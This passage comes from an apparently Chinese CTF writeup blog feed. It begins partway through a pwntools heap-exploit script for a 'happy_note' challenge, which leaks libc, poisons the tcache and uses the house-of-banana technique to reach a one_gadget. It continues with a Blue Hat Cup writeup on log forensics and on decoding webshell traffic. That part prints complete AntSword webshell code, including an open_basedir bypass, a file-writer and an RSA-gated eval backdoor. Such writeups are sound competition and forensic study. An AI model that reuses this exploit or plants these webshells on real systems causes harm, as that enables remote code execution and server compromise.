class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process([<span class="string">&quot;./ld-2.34.so&quot;</span>,<span class="string">&quot;./happy_note&quot;</span>],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line">elf = ELF(<span class="string">&#x27;happy_note&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">one = [<span class="number">0xeacec</span>,<span class="number">0xeacef</span>,<span class="number">0xeacf2</span>]</span><br><span class="line"></span><br><span class="line">menu = <span class="string">b&#x27;&gt;&gt; &#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,t</span>):</span><br><span class="line">p.sendlineafter(menu,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;note:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;[2]&#x27;</span>,<span class="built_in">str</span>(t).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(menu,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;note:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(menu,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;show?&#x27;</span>,<span class="built_in">str</span>(idx).encode())   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    p.sendlineafter(menu,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;note:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;content&#x27;</span>,content) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendlineafter(menu,<span class="string">b&#x27;666&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;note:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line">[add(x,<span class="number">0x200</span>,<span class="number">1</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]<span class="comment">#0-7</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x1e0</span>,<span class="number">1</span>)<span class="comment">#8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">[delete(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)]</span><br><span class="line">backdoor(<span class="number">7</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x219cc0</span></span><br><span class="line">padding = libc_base + <span class="number">0x218bc0</span></span><br><span class="line">l_next = libc_base + <span class="number">0x228088</span> - <span class="number">0x8</span></span><br><span class="line">rtl_global = libc_base + <span class="number">0x266040</span></span><br><span class="line">one_gadget = libc_base + one[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;l_next&#x27;</span>,<span class="built_in">hex</span>(l_next))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak tcache_key</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x10</span>,<span class="number">1</span>)<span class="comment">#7,idx=9</span></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">key = u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap = (key&lt;&lt;<span class="number">12</span>)+<span class="number">0x500</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;key&#x27;</span>,<span class="built_in">hex</span>(key))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;heap&#x27;</span>,<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b calloc\nc&#x27;)</span></span><br><span class="line"><span class="comment">#tcache poisoning</span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x1e0</span>,<span class="number">1</span>)<span class="comment">#7,idx=10</span></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x1f1</span>)+p64(key^l_next))</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x1e0</span>,<span class="number">2</span>)<span class="comment">#7,idx=10</span></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x1e0</span>,<span class="number">2</span>)<span class="comment">#target</span></span><br><span class="line">edit(<span class="number">11</span>,p64(padding)+p64(heap))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b calloc\nb free\nb *&#x27;+str(hex(one_gadget))+&#x27;\nc&#x27;)</span></span><br><span class="line"><span class="comment">#house of banana</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x1f8</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x1f8</span>,<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += p64(heap)</span><br><span class="line">payload = payload.ljust(<span class="number">0x38</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(heap+<span class="number">0x58</span>)</span><br><span class="line">payload += p64(<span class="number">0x8</span>)</span><br><span class="line">payload += p64(one_gadget)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(heap+<span class="number">0x40</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(heap+<span class="number">0x48</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x1f8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x31c</span>-<span class="number">0x10</span>-<span class="number">0x200</span>)+p8(<span class="number">0x9</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"><span class="comment">#exit</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> 2022巅峰极客网络安全技能挑战赛初赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第六届蓝帽杯全国大学生网络安全技能大赛半决赛Writeup</title>
      <link href="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/"/>
      <url>/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/</url>
      
        <content type="html"><![CDATA[<h1 id="第六届”蓝帽杯“全国大学生网络安全技能大赛半决赛-Writeups"><a href="#第六届”蓝帽杯“全国大学生网络安全技能大赛半决赛-Writeups" class="headerlink" title="第六届”蓝帽杯“全国大学生网络安全技能大赛半决赛 Writeups"></a>第六届”蓝帽杯“全国大学生网络安全技能大赛半决赛 Writeups</h1><blockquote><p>By ACT Team. 2022.8.4</p></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="1-神秘的日志"><a href="#1-神秘的日志" class="headerlink" title="1. 神秘的日志"></a>1. 神秘的日志</h3><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/1.PNG" alt="日志"></p><p>给了两个日志文件，首先在系统日志中筛选ID为6038的NTLM身份验证事件，然后根据筛选结果的第二条的时间2022&#x2F;4&#x2F;17 11:27:06去安全日志中查询相同时间的登录日志</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/2.PNG" alt="日志"></p><p>找到这条登录日志后在下方的详细信息中奖SystemTime的字符串复制进行md5计算就是flag值</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/3.PNG" alt="3"></p><p>flag{dafd0428f634aefd1ddb26f8257c791f}</p><h3 id="2-加密的通道"><a href="#2-加密的通道" class="headerlink" title="2. 加密的通道"></a>2. 加密的通道</h3><p>分析流量数据包，发现大马（shell连接管理工具）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$opdir</span>=@<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;open_basedir&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$opdir</span>) &#123;</span><br><span class="line"><span class="variable">$ocwd</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line"><span class="variable">$oparr</span>=<span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;/;|:/&quot;</span>,<span class="variable">$opdir</span>);</span><br><span class="line">@<span class="title function_ invoke__">array_push</span>(<span class="variable">$oparr</span>,<span class="variable">$ocwd</span>,<span class="title function_ invoke__">sys_get_temp_dir</span>());</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$oparr</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(!@<span class="title function_ invoke__">is_writable</span>(<span class="variable">$item</span>)) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="variable">$tmdir</span>=<span class="variable">$item</span>.<span class="string">&quot;/.04ec7d2d70b2&quot;</span>;</span><br><span class="line">@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line"><span class="keyword">if</span>(!@<span class="title function_ invoke__">file_exists</span>(<span class="variable">$tmdir</span>)) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">chdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;..&quot;</span>);</span><br><span class="line"><span class="variable">$cntarr</span>=@<span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;/\\\\|\//&quot;</span>,<span class="variable">$tmdir</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">sizeof</span>(<span class="variable">$cntarr</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">@<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>,<span class="string">&quot;/&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">rmdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="variable">$output</span>=<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;4947&quot;</span>.<span class="string">&quot;16eb8&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;0fd21&quot;</span>.<span class="string">&quot;b9b2f&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="variable">$f</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;o8ef400b0da61f&quot;</span>],<span class="number">2</span>));</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&quot;jf85b04afff284&quot;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\r&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$buf</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>);<span class="variable">$i</span>+=<span class="number">2</span>)<span class="variable">$buf</span>.=<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>,<span class="variable">$i</span>,<span class="number">2</span>));</span><br><span class="line"><span class="keyword">echo</span>(@<span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$f</span>,<span class="string">&quot;a&quot;</span>),<span class="variable">$buf</span>)?<span class="string">&quot;1&quot;</span>:<span class="string">&quot;0&quot;</span>);</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="title function_ invoke__">asoutput</span>();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$D</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;o8ef400b0da61f&quot;</span>],<span class="number">2</span>));</span><br></pre></td></tr></table></figure><p>分析代码可知，base64截取两位后字符进行解码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span>@Cat:~$ <span class="built_in">echo</span> <span class="string">&quot;SqQzovcGhwc3R1ZHlfcHJvL1dXVy8=&quot;</span> | <span class="built_in">cut</span> -b 3- | <span class="built_in">base64</span> -d</span><br><span class="line">C:/phpstudy_pro/WWW/</span><br></pre></td></tr></table></figure><p>重点关注写<code>rsa.php</code>文件成功的请求，发现写文件操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="variable">$f</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;o8ef400b0da61f&quot;</span>],<span class="number">2</span>));</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&quot;jf85b04afff284&quot;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\r&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$buf</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>);<span class="variable">$i</span>+=<span class="number">2</span>)<span class="variable">$buf</span>.=<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>,<span class="variable">$i</span>,<span class="number">2</span>));</span><br><span class="line"><span class="keyword">echo</span>(@<span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$f</span>,<span class="string">&quot;a&quot;</span>),<span class="variable">$buf</span>)?<span class="string">&quot;1&quot;</span>:<span class="string">&quot;0&quot;</span>);</span><br><span class="line">;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提取核心代码，本地环境搭建，写入文件测试，目的是提取<code>rsa.php</code>文件内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span>=<span class="variable">$_POST</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&quot;b&quot;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\r&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$buf</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>);<span class="variable">$i</span>+=<span class="number">2</span>)<span class="variable">$buf</span>.=<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>,<span class="variable">$i</span>,<span class="number">2</span>));</span><br><span class="line"><span class="keyword">echo</span>(@<span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$f</span>,<span class="string">&quot;a&quot;</span>),<span class="variable">$buf</span>)?<span class="string">&quot;1&quot;</span>:<span class="string">&quot;0&quot;</span>);</span><br><span class="line">;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804180728692.png" alt="提取rsa.php"></p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804180739604.png" alt="image-20220804180739604"></p><p>发现有<code>PHPJiaMi</code>的混淆，使用<a href="https://github.com/wenshui2008/phpjiami_decode">phpjiami_decode</a>进行去混淆（得到代码如下）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;ant&#x27;</span>];</span><br><span class="line"><span class="variable">$pk</span> = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDieYmLtWbGRSvUtevSlTOozmWR</span></span><br><span class="line"><span class="string">qEGF4Hfvb1YCoVYAAlhnHnyMk+aLRvLXKgmerWiS+QD6y08Ispuzzn02tHE6d4Qp</span></span><br><span class="line"><span class="string">DuPiPO9PAdGSXzFVFLK2hOrkXLsDXugNTdVUprdkPPI1YY0ZnMs1bT2Zf2dfuBI5</span></span><br><span class="line"><span class="string">0S5e5sSOF85kNq/zwwIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"><span class="variable">$cmds</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;|&quot;</span>, <span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$pk</span> = <span class="title function_ invoke__">openssl_pkey_get_public</span>(<span class="variable">$pk</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$cmds</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">openssl_public_decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$value</span>), <span class="variable">$de</span>, <span class="variable">$pk</span>)) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> .= <span class="variable">$de</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">openssl_public_decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v</span>), <span class="variable">$de</span>, <span class="variable">$pk</span>)) &#123;</span><br><span class="line">     <span class="variable">$_POST</span>[<span class="variable">$k</span>]=<span class="variable">$de</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$cmd</span>); </span><br></pre></td></tr></table></figure><p>添加了<code>rsa.php</code>后，通过新加密又写入<code>flag.txt</code>文件，结合上面脚本，构造流量包的请求（代码添加辅助调试信息）：</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804181457776.png" alt="得到flag.txt"></p><h2 